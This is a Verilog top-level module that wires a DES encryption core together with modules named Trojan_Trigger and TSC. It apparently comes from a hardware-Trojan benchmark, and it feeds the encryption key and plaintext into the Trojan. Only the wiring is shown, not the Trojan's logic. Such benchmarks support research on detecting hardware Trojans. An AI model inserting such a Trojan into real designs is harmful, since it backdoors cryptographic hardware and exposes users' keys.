`timescale 1ns / 1ps

module top(clk, rst, decrypt, roundSel, key, desIn, desOut, Tj_Trig);
    input clk;
    input rst;
    input decrypt;
    input [3:0] roundSel;
    input [55:0] key;
    input [63:0] desIn;
    output [63:0] desOut;
	output Tj_Trig;

		des DES (
			.clk(clk),
			.roundSel(roundSel),
			.decrypt(decrypt),
			.key(key),
			.desIn(desIn),
			.desOut(desOut));
		Trojan_Trigger Trigger(rst, clk, desIn, Tj_Trig);
		TSC Trojan (clk, rst, key, desIn, Tj_Trig);

endmodule
